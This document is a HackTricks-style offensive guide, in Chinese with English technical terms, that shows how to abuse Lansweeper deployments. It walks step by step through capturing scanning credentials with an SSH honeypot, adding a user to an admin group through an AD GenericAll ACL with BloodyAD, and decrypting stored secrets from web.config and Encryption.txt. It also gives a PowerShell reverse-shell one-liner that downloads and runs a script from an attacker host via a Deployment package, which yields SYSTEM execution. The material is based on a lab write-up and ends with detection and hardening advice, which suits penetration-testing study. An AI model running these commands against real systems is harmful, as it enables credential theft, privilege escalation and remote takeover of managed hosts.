# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper 是一个 IT 资产发现与清单平台，通常部署在 Windows 上并与 Active Directory 集成。Lansweeper 中配置的凭据由其扫描引擎使用，通过 SSH、SMB/WMI 和 WinRM 等协议向资产进行身份验证。错误配置通常会导致：

- 通过将扫描目标重定向到攻击者控制的主机（honeypot）来拦截凭据
- 滥用 Lansweeper 相关组暴露的 AD ACLs，以获取远程访问权限
- 在主机上解密 Lansweeper 配置的 secrets（连接字符串和存储的扫描凭据）
- 通过 Deployment 功能在受管理端点上执行代码（通常以 SYSTEM 身份运行）

本页面总结了在 engagements 期间滥用这些行为的实用攻击流程和命令。

## 1) 通过 honeypot 获取扫描凭据（SSH 示例）

思路：创建一个指向你的主机的 Scanning Target，并将现有的 Scanning Credentials 映射到该目标。扫描运行时，Lansweeper 会尝试使用这些凭据进行身份验证，而你的 honeypot 将捕获这些凭据。<sup>[[1]](#references)</sup>

步骤概览（web UI）：
- Scanning → Scanning Targets → Add Scanning Target
- Type：IP Range（或 Single IP）= 你的 VPN IP
- 将 SSH 端口配置为可访问的端口（例如，在 22 被阻止时使用 2022）
- 禁用 schedule，并计划手动触发
- Scanning → Scanning Credentials → 确保存在 Linux/SSH creds；将其映射到新目标（根据需要启用全部）
- 在目标上点击 “Scan now”
- 运行 SSH honeypot 并获取尝试使用的用户名/密码

使用 sshesame 的示例：<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
针对 DC 服务验证捕获的 creds：
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- 当你可以诱使 scanner 连接到你的 listener 时，其他 protocols 也同样适用（SMB/WinRM honeypots 等）。SSH 通常是最简单的选择。
- 许多 scanners 会使用独特的 client banners 标识自身（例如 RebexSSH），并会尝试执行无害的 commands（uname、whoami 等）。

## 2) AD ACL abuse：将自己加入 app-admin group 以获得 remote access

使用 BloodHound 枚举 compromised account 的 effective rights。常见的发现是：某个 scanner 或 app-specific group（例如 “Lansweeper Discovery”）对 privileged group（例如 “Lansweeper Admins”）拥有 GenericAll。如果该 privileged group 同时也是 “Remote Management Users” 的成员，那么将自己加入其中后即可使用 WinRM。<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
使用 BloodyAD（Linux）利用组上的 GenericAll 权限：<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
然后获取一个 interactive shell：
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
提示：Kerberos 操作对时间敏感。如果遇到 KRB_AP_ERR_SKEW，请先与 DC 同步时间：
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 解密主机上由 Lansweeper 配置的 secrets

在 Lansweeper server 上，ASP.NET site 通常会存储加密的 connection string，以及 application 使用的 symmetric key。通过适当的本地访问权限，你可以解密 DB connection string，然后提取存储的 scanning credentials。<sup>[[1]](#references)</sup>

典型位置：
- Web config：`C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key：`C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

使用 SharpLansweeperDecrypt 自动解密并导出存储的 creds：<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
预期输出包括数据库连接详细信息以及明文扫描凭据，例如整个环境中使用的 Windows 和 Linux 账户。这些账户通常在域主机上拥有提升的本地权限：
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
使用恢复的 Windows 扫描凭据获取特权访问：
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

作为“Lansweeper Admins”的成员，Web UI 会暴露 Deployment 和 Configuration。在 Deployment → Deployment packages 下，你可以创建在目标 asset 上运行任意命令的 package。命令由具有高权限的 Lansweeper service 执行，从而在选定主机上以 NT AUTHORITY\SYSTEM 身份实现 code execution。<sup>[[1]](#references)</sup>

高级步骤：
- 创建新的 Deployment package，运行 PowerShell 或 cmd one-liner（reverse shell、add-user 等）。
- 指定目标 asset（例如运行 Lansweeper 的 DC/主机），然后点击 Deploy/Run now。
- 获取 SYSTEM 权限的 shell。

示例 payload（PowerShell）：
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment 操作会产生大量噪声，并在 Lansweeper 和 Windows event logs 中留下日志。请谨慎使用。

## 检测与加固

- 限制或移除 anonymous SMB 枚举。监控 RID cycling，以及对 Lansweeper shares 的异常访问。
- Egress controls：阻止或严格限制 scanner hosts 发起的出站 SSH/SMB/WinRM。针对非标准端口（例如 2022）以及 Rebex 等异常 client banners 触发告警。
- 保护 `Website\\web.config` 和 `Key\\Encryption.txt`。将 secrets 外置到 vault，并在暴露后进行轮换。在可行的情况下，考虑使用具有最小权限的 service accounts 和 gMSA。
- AD 监控：针对 Lansweeper 相关组（例如 “Lansweeper Admins”、“Remote Management Users”）的变更，以及针对 privileged groups 授予 GenericAll/Write membership 的 ACL 变更触发告警。
- Audit Deployment package 的创建、变更和执行；针对会生成 cmd.exe/powershell.exe 或建立异常出站连接的 packages 触发告警。

## 相关主题
- SMB/LSA/SAMR 枚举和 RID cycling
- Kerberos password spraying 和 clock skew 注意事项
- 使用 BloodHound 对 application-admin groups 进行路径分析
- WinRM 使用和 lateral movement

## 参考资料
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
